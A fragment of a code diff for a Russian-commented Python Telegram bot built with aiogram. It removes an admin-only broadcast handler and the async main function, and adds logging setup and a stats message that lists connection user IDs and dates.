+        stats += f"• `{conn['user_id']}` - {conn['date'][:10]}\n"
     
-    await callback.message.answer("Введите сообщение для рассылки всем пользователям:", reply_markup=back_menu())
-    await state.set_state(AdminStates.waiting_broadcast_msg)
-    try:
-        await callback.message.delete()
-    except:
-        pass
+    await message.answer(stats, parse_mode="Markdown")
 
-@dp.message(AdminStates.waiting_broadcast_msg, F.text)
-async def admin_broadcast_finish(message: Message, state: FSMContext, bot: Bot):
-    if message.from_user.id not in SUPER_ADMIN_IDS:
-        return
-    
-    users = db.get_all_users()
-    count = 0
-    await message.answer(f"🚀 Начинаю рассылку на {len(users)} пользователей...")
-    
-    for user_id in users:
-        try:
-            await bot.send_message(user_id, message.text, parse_mode="HTML")
-            count += 1
-            await asyncio.sleep(0.05) # Защита от флуда
-        except:
-            pass
-    
-    await message.answer(f"✅ Рассылка завершена! Получили: {count} пользователей.", reply_markup=back_menu())
-    await state.clear()
-
-async def main():
-    bot = Bot(token=BOT_TOKEN)
-    print("✅ GIFT GUARD бот запущен!")
-    await dp.start_polling(bot)
-
+# Запуск
 if __name__ == "__main__":
-    asyncio.run(main())
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    )
+    logging.info("🤖 Бот запущен")
+    dp.run_polling(bot)
